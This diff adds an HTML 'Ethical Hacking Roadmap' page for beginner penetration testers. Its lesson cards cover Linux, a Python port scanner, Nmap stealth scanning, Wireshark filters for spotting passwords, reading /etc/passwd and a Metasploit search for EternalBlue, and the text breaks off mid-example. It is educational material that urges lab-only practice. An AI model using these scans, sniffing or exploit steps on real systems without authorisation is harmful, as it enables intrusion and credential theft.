@@ -1,0 +1,1832 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Ethical Hacking Roadmap</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;500;600;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #050a0e;
+    --bg2: #0a1520;
+    --bg3: #0d1f2d;
+    --green: #00ff88;
+    --green2: #00cc6a;
+    --cyan: #00e5ff;
+    --red: #ff3366;
+    --yellow: #ffd700;
+    --orange: #ff7b00;
+    --purple: #a855f7;
+    --text: #c8e6c9;
+    --text-dim: #5a7a6a;
+    --border: rgba(0,255,136,0.15);
+    --glow: 0 0 20px rgba(0,255,136,0.3);
+    --card-bg: rgba(10,25,32,0.9);
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 16px;
+    overflow-x: hidden;
+  }
+
+  /* Animated background grid */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image:
+      linear-gradient(rgba(0,255,136,0.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(0,255,136,0.03) 1px, transparent 1px);
+    background-size: 40px 40px;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  /* Scanline effect */
+  body::after {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 2px,
+      rgba(0,0,0,0.08) 2px,
+      rgba(0,0,0,0.08) 4px
+    );
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  /* ═══════════ HEADER ═══════════ */
+  header {
+    position: relative;
+    z-index: 10;
+    text-align: center;
+    padding: 60px 20px 40px;
+    border-bottom: 1px solid var(--border);
+    background: linear-gradient(180deg, rgba(0,255,136,0.05) 0%, transparent 100%);
+  }
+
+  .skull-icon {
+    font-size: 64px;
+    display: block;
+    margin-bottom: 16px;
+    filter: drop-shadow(0 0 20px var(--green));
+    animation: pulse 2s ease-in-out infinite;
+  }
+
+  @keyframes pulse {
+    0%, 100% { filter: drop-shadow(0 0 20px var(--green)); }
+    50% { filter: drop-shadow(0 0 40px var(--green)) drop-shadow(0 0 60px rgba(0,255,136,0.4)); }
+  }
+
+  header h1 {
+    font-family: 'Orbitron', monospace;
+    font-size: clamp(28px, 6vw, 64px);
+    font-weight: 900;
+    color: var(--green);
+    text-shadow: 0 0 30px rgba(0,255,136,0.7), 0 0 60px rgba(0,255,136,0.3);
+    letter-spacing: 4px;
+    line-height: 1.1;
+  }
+
+  header h1 span { color: var(--cyan); }
+
+  .subtitle {
+    font-family: 'Share Tech Mono', monospace;
+    color: var(--text-dim);
+    font-size: clamp(12px, 2vw, 16px);
+    margin-top: 12px;
+    letter-spacing: 3px;
+  }
+
+  .subtitle::before { content: '> '; color: var(--green); }
+
+  .warning-banner {
+    display: inline-flex;
+    align-items: center;
+    gap: 10px;
+    margin-top: 24px;
+    padding: 10px 24px;
+    border: 1px solid rgba(255,211,0,0.4);
+    background: rgba(255,211,0,0.05);
+    border-radius: 4px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    color: var(--yellow);
+    letter-spacing: 1px;
+  }
+
+  /* ═══════════ NAV ═══════════ */
+  nav {
+    position: sticky;
+    top: 0;
+    z-index: 100;
+    background: rgba(5,10,14,0.95);
+    border-bottom: 1px solid var(--border);
+    backdrop-filter: blur(10px);
+    padding: 12px 20px;
+    overflow-x: auto;
+    white-space: nowrap;
+    scrollbar-width: none;
+  }
+
+  nav::-webkit-scrollbar { display: none; }
+
+  .nav-inner {
+    display: flex;
+    gap: 8px;
+    justify-content: center;
+    min-width: max-content;
+    margin: 0 auto;
+  }
+
+  nav a {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    padding: 6px 14px;
+    border: 1px solid var(--border);
+    border-radius: 3px;
+    color: var(--text-dim);
+    text-decoration: none;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    letter-spacing: 1px;
+    transition: all 0.2s;
+  }
+
+  nav a:hover {
+    border-color: var(--green);
+    color: var(--green);
+    background: rgba(0,255,136,0.05);
+    box-shadow: var(--glow);
+  }
+
+  /* ═══════════ MAIN LAYOUT ═══════════ */
+  main {
+    position: relative;
+    z-index: 5;
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 40px 20px 80px;
+  }
+
+  /* Progress bar */
+  .progress-section {
+    margin-bottom: 48px;
+    padding: 24px;
+    border: 1px solid var(--border);
+    background: var(--card-bg);
+    border-radius: 4px;
+  }
+
+  .progress-label {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    color: var(--text-dim);
+    margin-bottom: 12px;
+    display: flex;
+    justify-content: space-between;
+  }
+
+  .progress-label span { color: var(--green); }
+
+  .progress-bar {
+    height: 6px;
+    background: rgba(255,255,255,0.05);
+    border-radius: 3px;
+    overflow: hidden;
+    position: relative;
+  }
+
+  .progress-fill {
+    height: 100%;
+    width: 0%;
+    background: linear-gradient(90deg, var(--green), var(--cyan));
+    border-radius: 3px;
+    transition: width 1s ease;
+    box-shadow: 0 0 10px rgba(0,255,136,0.5);
+  }
+
+  /* ═══════════ PHASE SECTIONS ═══════════ */
+  .phase {
+    margin-bottom: 60px;
+  }
+
+  .phase-header {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    margin-bottom: 28px;
+    padding-bottom: 16px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .phase-num {
+    font-family: 'Orbitron', monospace;
+    font-size: 11px;
+    font-weight: 700;
+    padding: 4px 10px;
+    border-radius: 2px;
+    letter-spacing: 2px;
+    flex-shrink: 0;
+  }
+
+  .phase-num.beginner { background: rgba(0,255,136,0.15); color: var(--green); border: 1px solid var(--green); }
+  .phase-num.intermediate { background: rgba(0,229,255,0.1); color: var(--cyan); border: 1px solid var(--cyan); }
+  .phase-num.advanced { background: rgba(255,123,0,0.1); color: var(--orange); border: 1px solid var(--orange); }
+  .phase-num.expert { background: rgba(255,51,102,0.1); color: var(--red); border: 1px solid var(--red); }
+  .phase-num.elite { background: rgba(168,85,247,0.1); color: var(--purple); border: 1px solid var(--purple); }
+
+  .phase-title {
+    font-family: 'Orbitron', monospace;
+    font-size: clamp(18px, 3vw, 26px);
+    font-weight: 700;
+    color: #fff;
+  }
+
+  .phase-duration {
+    margin-left: auto;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    color: var(--text-dim);
+    flex-shrink: 0;
+  }
+
+  /* Lesson cards grid */
+  .lessons-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
+    gap: 20px;
+  }
+
+  /* ═══════════ LESSON CARD ═══════════ */
+  .card {
+    background: var(--card-bg);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    overflow: hidden;
+    transition: transform 0.2s, box-shadow 0.2s, border-color 0.2s;
+    cursor: pointer;
+  }
+
+  .card:hover {
+    transform: translateY(-3px);
+    border-color: rgba(0,255,136,0.4);
+    box-shadow: 0 8px 32px rgba(0,0,0,0.4), 0 0 20px rgba(0,255,136,0.1);
+  }
+
+  .card-header {
+    padding: 16px 20px;
+    display: flex;
+    align-items: flex-start;
+    gap: 12px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .card-icon {
+    font-size: 28px;
+    flex-shrink: 0;
+    margin-top: 2px;
+  }
+
+  .card-meta { flex: 1; min-width: 0; }
+
+  .card-title {
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 17px;
+    font-weight: 600;
+    color: #fff;
+    line-height: 1.3;
+    margin-bottom: 4px;
+  }
+
+  .card-tags {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 6px;
+    margin-top: 6px;
+  }
+
+  .tag {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    padding: 2px 8px;
+    border-radius: 2px;
+    letter-spacing: 1px;
+  }
+
+  .tag.tool { background: rgba(0,229,255,0.08); color: var(--cyan); border: 1px solid rgba(0,229,255,0.2); }
+  .tag.concept { background: rgba(0,255,136,0.08); color: var(--green2); border: 1px solid rgba(0,255,136,0.2); }
+  .tag.practice { background: rgba(168,85,247,0.08); color: var(--purple); border: 1px solid rgba(168,85,247,0.2); }
+
+  .card-body {
+    padding: 16px 20px;
+  }
+
+  .card-desc {
+    font-size: 14px;
+    color: rgba(200,230,201,0.7);
+    line-height: 1.6;
+    margin-bottom: 16px;
+  }
+
+  /* Code example block */
+  .code-block {
+    background: rgba(0,0,0,0.6);
+    border: 1px solid rgba(0,255,136,0.1);
+    border-left: 3px solid var(--green);
+    border-radius: 3px;
+    padding: 14px;
+    margin-bottom: 14px;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .code-block::before {
+    content: attr(data-label);
+    position: absolute;
+    top: 8px;
+    right: 10px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    color: var(--text-dim);
+    letter-spacing: 1px;
+  }
+
+  .code-block code {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    line-height: 1.7;
+    display: block;
+    color: var(--green);
+    overflow-x: auto;
+    white-space: pre;
+  }
+
+  .code-block code .comment { color: var(--text-dim); }
+  .code-block code .cmd { color: var(--cyan); }
+  .code-block code .flag { color: var(--yellow); }
+  .code-block code .output { color: rgba(200,230,201,0.6); }
+  .code-block code .highlight { color: var(--orange); }
+
+  .copy-btn {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    margin-top: 8px;
+    padding: 5px 12px;
+    background: transparent;
+    border: 1px solid var(--border);
+    border-radius: 3px;
+    color: var(--text-dim);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    cursor: pointer;
+    transition: all 0.2s;
+    letter-spacing: 1px;
+  }
+
+  .copy-btn:hover { border-color: var(--green); color: var(--green); }
+  .copy-btn.copied { border-color: var(--green); color: var(--green); }
+
+  /* Topics list */
+  .topics {
+    list-style: none;
+    display: flex;
+    flex-direction: column;
+    gap: 6px;
+  }
+
+  .topics li {
+    font-size: 13px;
+    color: rgba(200,230,201,0.75);
+    display: flex;
+    align-items: flex-start;
+    gap: 8px;
+    line-height: 1.4;
+  }
+
+  .topics li::before {
+    content: '▸';
+    color: var(--green);
+    flex-shrink: 0;
+    margin-top: 1px;
+  }
+
+  /* YouTube link button */
+  .yt-link {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin-top: 14px;
+    padding: 10px 14px;
+    background: rgba(255,0,0,0.06);
+    border: 1px solid rgba(255,60,60,0.25);
+    border-radius: 4px;
+    text-decoration: none;
+    transition: all 0.2s;
+  }
+
+  .yt-link:hover {
+    background: rgba(255,0,0,0.12);
+    border-color: rgba(255,60,60,0.5);
+    transform: translateX(3px);
+  }
+
+  .yt-icon {
+    font-size: 20px;
+    flex-shrink: 0;
+  }
+
+  .yt-info { min-width: 0; }
+
+  .yt-label {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    color: rgba(255,100,100,0.7);
+    letter-spacing: 1px;
+    text-transform: uppercase;
+    margin-bottom: 2px;
+  }
+
+  .yt-title {
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 13px;
+    font-weight: 600;
+    color: #ff7b7b;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+  }
+
+  /* Resources */
+  .resources {
+    margin-top: 14px;
+    padding-top: 14px;
+    border-top: 1px solid var(--border);
+    display: flex;
+    flex-wrap: wrap;
+    gap: 8px;
+  }
+
+  .resource-link {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    color: var(--cyan);
+    text-decoration: none;
+    display: flex;
+    align-items: center;
+    gap: 4px;
+    opacity: 0.7;
+    transition: opacity 0.2s;
+  }
+
+  .resource-link:hover { opacity: 1; }
+
+  /* ═══════════ TOOLS SECTION ═══════════ */
+  .tools-section {
+    margin: 60px 0;
+    padding: 32px;
+    border: 1px solid var(--border);
+    background: var(--card-bg);
+    border-radius: 4px;
+  }
+
+  .section-title {
+    font-family: 'Orbitron', monospace;
+    font-size: clamp(16px, 3vw, 22px);
+    font-weight: 700;
+    color: var(--cyan);
+    margin-bottom: 24px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+
+  .section-title::after {
+    content: '';
+    flex: 1;
+    height: 1px;
+    background: var(--border);
+  }
+
+  .tools-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+    gap: 12px;
+  }
+
+  .tool-chip {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    padding: 10px 14px;
+    border: 1px solid var(--border);
+    border-radius: 3px;
+    background: rgba(0,0,0,0.3);
+    transition: all 0.2s;
+  }
+
+  .tool-chip:hover {
+    border-color: rgba(0,229,255,0.4);
+    background: rgba(0,229,255,0.05);
+  }
+
+  .tool-chip .tool-emoji { font-size: 20px; }
+  .tool-chip .tool-name {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    color: var(--cyan);
+  }
+  .tool-chip .tool-use {
+    font-size: 11px;
+    color: var(--text-dim);
+    margin-top: 2px;
+  }
+
+  /* ═══════════ FOOTER ═══════════ */
+  footer {
+    position: relative;
+    z-index: 5;
+    text-align: center;
+    padding: 40px 20px;
+    border-top: 1px solid var(--border);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    color: var(--text-dim);
+    line-height: 2;
+  }
+
+  footer .green { color: var(--green); }
+
+  /* ═══════════ RESPONSIVE ═══════════ */
+  @media (max-width: 768px) {
+    .lessons-grid { grid-template-columns: 1fr; }
+    .phase-header { flex-wrap: wrap; }
+    .phase-duration { margin-left: 0; }
+    .tools-grid { grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); }
+    .nav-inner { justify-content: flex-start; }
+    header { padding: 40px 16px 28px; }
+    main { padding: 24px 16px 60px; }
+    .tools-section { padding: 20px 16px; }
+  }
+
+  @media (max-width: 480px) {
+    .tools-grid { grid-template-columns: 1fr 1fr; }
+    .card-header { gap: 8px; }
+    .code-block code { font-size: 11px; }
+  }
+
+  /* Typing animation for terminal */
+  .terminal-intro {
+    background: rgba(0,0,0,0.7);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    padding: 20px 24px;
+    margin-bottom: 40px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    line-height: 2;
+  }
+
+  .terminal-intro .line { opacity: 0; animation: fadeIn 0.3s forwards; }
+  .terminal-intro .line:nth-child(1) { animation-delay: 0.2s; color: var(--green); }
+  .terminal-intro .line:nth-child(2) { animation-delay: 0.6s; color: var(--text-dim); }
+  .terminal-intro .line:nth-child(3) { animation-delay: 1.0s; color: var(--text-dim); }
+  .terminal-intro .line:nth-child(4) { animation-delay: 1.4s; color: var(--cyan); }
+  .terminal-intro .line:nth-child(5) { animation-delay: 1.8s; color: var(--yellow); }
+
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateX(-10px); }
+    to { opacity: 1; transform: translateX(0); }
+  }
+
+  .cursor {
+    display: inline-block;
+    width: 8px;
+    height: 14px;
+    background: var(--green);
+    animation: blink 1s steps(1) infinite;
+    vertical-align: middle;
+    margin-left: 4px;
+  }
+
+  @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
+</style>
+</head>
+<body>
+
+<header>
+  <span class="skull-icon">💀</span>
+  <h1>ETHICAL <span>HACKING</span><br>ROADMAP</h1>
+  <p class="subtitle">From Zero to Penetration Tester — Complete Guide</p>
+  <div class="warning-banner">
+    ⚠ &nbsp; FOR EDUCATIONAL PURPOSES ONLY — ALWAYS HACK WITH PERMISSION
+  </div>
+</header>
+
+<nav>
+  <div class="nav-inner">
+    <a href="#phase1">🟢 Beginner</a>
+    <a href="#phase2">🔵 Networking</a>
+    <a href="#phase3">🟡 Systems</a>
+    <a href="#phase4">🟠 Web Hacking</a>
+    <a href="#phase5">🔴 Advanced</a>
+    <a href="#phase6">💜 Expert</a>
+    <a href="#tools">🛠 Tools</a>
+    <a href="#labs">🏋 Labs</a>
+  </div>
+</nav>
+
+<main>
+
+  <!-- Terminal Intro -->
+  <div class="terminal-intro">
+    <div class="line">$ whoami → aspiring_ethical_hacker</div>
+    <div class="line"># This roadmap covers: Networking → Linux → Web Security → Exploitation → CTF</div>
+    <div class="line"># Estimated total time: 12–18 months of consistent practice</div>
+    <div class="line">$ sudo apt-get install knowledge persistence patience</div>
+    <div class="line">⚡ Remember: Knowledge without ethics is dangerous. Hack responsibly.<span class="cursor"></span></div>
+  </div>
+
+  <!-- ════════════════════════════════════ -->
+  <!-- PHASE 1: FOUNDATIONS -->
+  <!-- ════════════════════════════════════ -->
+  <section class="phase" id="phase1">
+    <div class="phase-header">
+      <span class="phase-num beginner">PHASE 01</span>
+      <h2 class="phase-title">Foundations & Linux Basics</h2>
+      <span class="phase-duration">⏱ 4–6 weeks</span>
+    </div>
+    <div class="lessons-grid">
+
+      <!-- Card: Linux CLI -->
+      <div class="card">
+        <div class="card-header">
+          <span class="card-icon">🐧</span>
+          <div class="card-meta">
+            <div class="card-title">Linux Command Line Mastery</div>
+            <div class="card-tags">
+              <span class="tag concept">ESSENTIAL</span>
+              <span class="tag tool">BASH</span>
+            </div>
+          </div>
+        </div>
+        <div class="card-body">
+          <p class="card-desc">Linux is the hacker's OS. Learn to navigate, manage files, permissions, and processes like a pro.</p>
+          <div class="code-block" data-label="TERMINAL">
+<code><span class="comment"># Navigate the filesystem</span>
+<span class="cmd">ls</span> <span class="flag">-la</span>          <span class="comment"># List with hidden files</span>
+<span class="cmd">cd</span> /var/log    <span class="comment"># Change directory</span>
+<span class="cmd">pwd</span>            <span class="comment"># Print working directory</span>
+
+<span class="comment"># File manipulation</span>
+<span class="cmd">cat</span> /etc/passwd <span class="comment"># View file content</span>
+<span class="cmd">grep</span> <span class="flag">-r</span> "root" /etc  <span class="comment"># Search recursively</span>
+<span class="cmd">find</span> / <span class="flag">-name</span> "*.conf" <span class="flag">2>/dev/null</span>
+
+<span class="comment"># Permissions</span>
+<span class="cmd">chmod</span> <span class="flag">755</span> script.sh
+<span class="cmd">sudo</span> <span class="flag">-l</span>  <span class="comment"># List sudo permissions</span></code>
+          </div>
+          <ul class="topics">
+            <li>File system hierarchy (/, /etc, /var, /home, /bin)</li>
+            <li>File permissions: read/write/execute (chmod, chown)</li>
+            <li>Piping and redirection (|, >, >>, 2>&1)</li>
+            <li>Process management (ps, kill, top, htop)</li>
+            <li>Text processing (grep, awk, sed, cut)</li>
+          </ul>
+          <a class="yt-link" href="https://www.youtube.com/watch?v=VbEx7B_PTOE" target="_blank" rel="noopener">
+            <span class="yt-icon">▶️</span>
+            <div class="yt-info">
+              <div class="yt-label">▸ Watch on YouTube · NetworkChuck</div>
+              <div class="yt-title">Linux for Hackers — EP 1 (FREE Beginner Course)</div>
+            </div>
+          </a>
+        </div>
+      </div>
+
+      <!-- Card: Python Scripting -->
+      <div class="card">
+        <div class="card-header">
+          <span class="card-icon">🐍</span>
+          <div class="card-meta">
+            <div class="card-title">Python for Hackers</div>
+            <div class="card-tags">
+              <span class="tag concept">SCRIPTING</span>
+              <span class="tag practice">CODE</span>
+            </div>
+          </div>
+        </div>
+        <div class="card-body">
+          <p class="card-desc">Automate attacks, build tools, write exploits. Python is the number one language for security scripting.</p>
+          <div class="code-block" data-label="PYTHON">
+<code><span class="comment"># Port scanner from scratch</span>
+<span class="highlight">import</span> socket
+
+<span class="highlight">def</span> scan_port(host, port):
+    s = socket.socket()
+    s.settimeout(0.5)
+    result = s.connect_ex((host, port))
+    s.close()
+    <span class="highlight">return</span> result == 0
+
+host = <span class="flag">"192.168.1.1"</span>
+<span class="highlight">for</span> port <span class="highlight">in</span> range(1, 1025):
+    <span class="highlight">if</span> scan_port(host, port):
+        <span class="cmd">print</span>(<span class="flag">f"[+] Port {port} OPEN"</span>)</code>
+          </div>
+          <ul class="topics">
+            <li>Sockets and network programming</li>
+            <li>File I/O and automation scripts</li>
+            <li>HTTP requests with requests library</li>
+            <li>Subprocess and OS interaction</li>
+            <li>Building your own mini tools</li>
+          </ul>
+          <a class="yt-link" href="https://www.youtube.com/watch?v=egg-GoT5iVk" target="_blank" rel="noopener">
+            <span class="yt-icon">▶️</span>
+            <div class="yt-info">
+              <div class="yt-label">▸ Watch on YouTube · NetworkChuck</div>
+              <div class="yt-title">Python for Hackers — full beginner tutorial</div>
+            </div>
+          </a>
+        </div>
+      </div>
+
+      <!-- Card: Virtualization -->
+      <div class="card">
+        <div class="card-header">
+          <span class="card-icon">🖥️</span>
+          <div class="card-meta">
+            <div class="card-title">Set Up Your Hacking Lab</div>
+            <div class="card-tags">
+              <span class="tag tool">VMWARE</span>
+              <span class="tag tool">KALI</span>
+            </div>
+          </div>
+        </div>
+        <div class="card-body">
+          <p class="card-desc">Build a safe, isolated lab environment. Never practice on systems you don't own!</p>
+          <div class="code-block" data-label="SETUP">
+<code><span class="comment"># After installing Kali Linux in VirtualBox/VMware:</span>
+
+<span class="comment"># Update your system</span>
+<span class="cmd">sudo apt update</span> && <span class="cmd">sudo apt upgrade</span> <span class="flag">-y</span>
+
+<span class="comment"># Install essential tools</span>
+<span class="cmd">sudo apt install</span> <span class="flag">nmap wireshark burpsuite</span>
+<span class="cmd">sudo apt install</span> <span class="flag">metasploit-framework</span>
+
+<span class="comment"># Download vulnerable VMs to practice on:</span>
+<span class="output"># → Metasploitable2 (intentionally vulnerable)</span>
+<span class="output"># → DVWA (Damn Vulnerable Web App)</span>
+<span class="output"># → VulnHub.com (free practice VMs)</span></code>
+          </div>
+          <ul class="topics">
+            <li>Install VirtualBox or VMware</li>
+            <li>Set up Kali Linux as your attack machine</li>
+            <li>Set up Metasploitable2 as your target</li>
+            <li>Configure host-only/NAT networking</li>
+            <li>Take VM snapshots before testing</li>
+          </ul>
+          <a class="yt-link" href="https://www.youtube.com/watch?v=lZAoFs75_cs" target="_blank" rel="noopener">
+            <span class="yt-icon">▶️</span>
+            <div class="yt-info">
+              <div class="yt-label">▸ Watch on YouTube · NetworkChuck</div>
+              <div class="yt-title">How to Set Up a Hacking Lab (Kali + VirtualBox)</div>
+            </div>
+          </a>
+        </div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- ════════════════════════════════════ -->
+  <!-- PHASE 2: NETWORKING -->
+  <!-- ════════════════════════════════════ -->
+  <section class="phase" id="phase2">
+    <div class="phase-header">
+      <span class="phase-num intermediate">PHASE 02</span>
+      <h2 class="phase-title">Networking & Protocols</h2>
+      <span class="phase-duration">⏱ 4–6 weeks</span>
+    </div>
+    <div class="lessons-grid">
+
+      <!-- Card: TCP/IP -->
+      <div class="card">
+        <div class="card-header">
+          <span class="card-icon">📡</span>
+          <div class="card-meta">
+            <div class="card-title">TCP/IP & OSI Model</div>
+            <div class="card-tags">
+              <span class="tag concept">THEORY</span>
+              <span class="tag concept">CORE</span>
+            </div>
+          </div>
+        </div>
+        <div class="card-body">
+          <p class="card-desc">Understanding how data travels across networks is essential for exploiting it.</p>
+          <div class="code-block" data-label="CONCEPTS">
+<code><span class="comment"># OSI Model (Remember: "Please Do Not Throw Sausage Pizza Away")</span>
+<span class="highlight">7</span> - Application  <span class="flag">HTTP, HTTPS, FTP, DNS, SMTP</span>
+<span class="highlight">6</span> - Presentation <span class="flag">SSL/TLS, encoding</span>
+<span class="highlight">5</span> - Session      <span class="flag">Session management</span>
+<span class="highlight">4</span> - Transport    <span class="flag">TCP, UDP (ports live here)</span>
+<span class="highlight">3</span> - Network      <span class="flag">IP addresses, routing</span>
+<span class="highlight">2</span> - Data Link    <span class="flag">MAC addresses, switches</span>
+<span class="highlight">1</span> - Physical     <span class="flag">Cables, signals, bits</span>
+
+<span class="comment"># TCP 3-way handshake:</span>
+<span class="output">Client → SYN     → Server</span>
+<span class="output">Client ← SYN-ACK ← Server</span>
+<span class="output">Client → ACK     → Server</span></code>
+          </div>
+          <ul class="topics">
+            <li>IP addressing (IPv4/IPv6), subnetting, CIDR</li>
+            <li>Common ports: 80/443, 22, 21, 25, 3306, 3389</li>
+            <li>DNS, DHCP, ARP protocols</li>
+            <li>How firewalls and NAT work</li>
+          </ul>
+          <a class="yt-link" href="https://www.youtube.com/watch?v=3b_TAYtzuho" target="_blank" rel="noopener">
+            <span class="yt-icon">▶️</span>
+            <div class="yt-info">
+              <div class="yt-label">▸ Watch on YouTube · PowerCert Animated Videos</div>
+              <div class="yt-title">OSI Model Explained | Real World Example</div>
+            </div>
+          </a>
+        </div>
+      </div>
+
+      <!-- Card: Nmap -->
+      <div class="card">
+        <div class="card-header">
+          <span class="card-icon">🔍</span>
+          <div class="card-meta">
+            <div class="card-title">Nmap — Network Scanning</div>
+            <div class="card-tags">
+              <span class="tag tool">NMAP</span>
+              <span class="tag practice">RECON</span>
+            </div>
+          </div>
+        </div>
+        <div class="card-body">
+          <p class="card-desc">Nmap is the most powerful network scanner. Master it to discover hosts, open ports, and running services.</p>
+          <div class="code-block" data-label="NMAP">
+<code><span class="comment"># Basic host discovery</span>
+<span class="cmd">nmap</span> <span class="flag">-sn</span> 192.168.1.0/24
+
+<span class="comment"># Full port scan + service detection</span>
+<span class="cmd">nmap</span> <span class="flag">-sV -sC -p-</span> 192.168.1.10
+
+<span class="comment"># Stealth SYN scan (less noisy)</span>
+<span class="cmd">nmap</span> <span class="flag">-sS -T2</span> 192.168.1.10
+
+<span class="comment"># OS detection</span>
+<span class="cmd">nmap</span> <span class="flag">-O</span> 192.168.1.10
+
+<span class="comment"># Output to file</span>
+<span class="cmd">nmap</span> <span class="flag">-oN</span> scan_results.txt <span class="flag">-A</span> 192.168.1.10
+
+<span class="output"># Example output:
+# 22/tcp  open  ssh     OpenSSH 8.2
+# 80/tcp  open  http    Apache httpd 2.4.41
+# 3306/tcp open  mysql  MySQL 5.7.32</span></code>
+          </div>
+          <ul class="topics">
+            <li>Scan types: -sS, -sT, -sU, -sA</li>
+            <li>Timing templates (-T0 to -T5)</li>
+            <li>NSE scripts for vuln scanning</li>
+            <li>Evading IDS/firewalls with decoys</li>
+          </ul>
+          <a class="yt-link" href="https://www.youtube.com/watch?v=4t4kBkMsDbQ" target="_blank" rel="noopener">
+            <span class="yt-icon">▶️</span>
+            <div class="yt-info">
+              <div class="yt-label">▸ Watch on YouTube · HackerSploit</div>
+              <div class="yt-title">Nmap Tutorial for Beginners — Full Course</div>
+            </div>
+          </a>
+        </div>
+      </div>
+
+      <!-- Card: Wireshark -->
+      <div class="card">
+        <div class="card-header">
+          <span class="card-icon">🦈</span>
+          <div class="card-meta">
+            <div class="card-title">Wireshark — Packet Analysis</div>
+            <div class="card-tags">
+              <span class="tag tool">WIRESHARK</span>
+              <span class="tag practice">SNIFFING</span>
+            </div>
+          </div>
+        </div>
+        <div class="card-body">
+          <p class="card-desc">Intercept and analyze network traffic to find credentials, sessions, and sensitive data in transit.</p>
+          <div class="code-block" data-label="WIRESHARK">
+<code><span class="comment"># Useful Wireshark filters:</span>
+
+<span class="flag">http</span>                    <span class="comment"># All HTTP traffic</span>
+<span class="flag">http.request.method == "POST"</span>  <span class="comment"># POST requests only</span>
+<span class="flag">tcp.port == 22</span>         <span class="comment"># SSH traffic</span>
+<span class="flag">ip.addr == 192.168.1.5</span> <span class="comment"># Filter by IP</span>
+<span class="flag">dns</span>                    <span class="comment"># DNS queries</span>
+<span class="flag">tcp contains "password"</span> <span class="comment"># Find passwords</span>
+<span class="flag">!(arp or dns or icmp)</span>  <span class="comment"># Remove noise</span>
+
+<span class="comment"># CLI alternative: tcpdump</span>
+<span class="cmd">tcpdump</span> <span class="flag">-i eth0 -w</span> capture.pcap
+<span class="cmd">tcpdump</span> <span class="flag">-r</span> capture.pcap <span class="flag">port 80</span></code>
+          </div>
+          <ul class="topics">
+            <li>Understanding packet structure</li>
+            <li>Following TCP streams</li>
+            <li>Extracting credentials from HTTP</li>
+            <li>ARP poisoning detection</li>
+          </ul>
+          <a class="yt-link" href="https://www.youtube.com/watch?v=lb1Dw0elw0Q" target="_blank" rel="noopener">
+            <span class="yt-icon">▶️</span>
+            <div class="yt-info">
+              <div class="yt-label">▸ Watch on YouTube · David Bombal</div>
+              <div class="yt-title">Wireshark Full Tutorial — Packet Analysis for Hackers</div>
+            </div>
+          </a>
+        </div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- ════════════════════════════════════ -->
+  <!-- PHASE 3: SYSTEM HACKING -->
+  <!-- ════════════════════════════════════ -->
+  <section class="phase" id="phase3">
+    <div class="phase-header">
+      <span class="phase-num intermediate">PHASE 03</span>
+      <h2 class="phase-title">System Hacking & Exploitation</h2>
+      <span class="phase-duration">⏱ 6–8 weeks</span>
+    </div>
+    <div class="lessons-grid">
+
+      <!-- Card: Metasploit -->
+      <div class="card">
+        <div class="card-header">
+          <span class="card-icon">☠️</span>
+          <div class="card-meta">
+            <div class="card-title">Metasploit Framework</div>
+            <div class="card-tags">
+              <span class="tag tool">MSF</span>
+              <span class="tag practice">EXPLOIT</span>
+            </div>
+          </div>
+        </div>
+        <div class="card-body">
+          <p class="card-desc">The world's most used penetration testing framework. Exploit known vulnerabilities and manage payloads.</p>
+          <div class="code-block" data-label="METASPLOIT">
+<code><span class="comment"># Launch Metasploit</span>
+<span class="cmd">msfconsole</span>
+
+<span class="comment"># Search for exploits</span>
+<span class="highlight">msf6></span> <span class="cmd">search</span> eternalblue
+<span class="highlight">msf6></span> <span class="cmd">search</span> type:exploit platform:windows
+
+<span class="comment"># Use EternalBlue (MS17-010) as example</span>
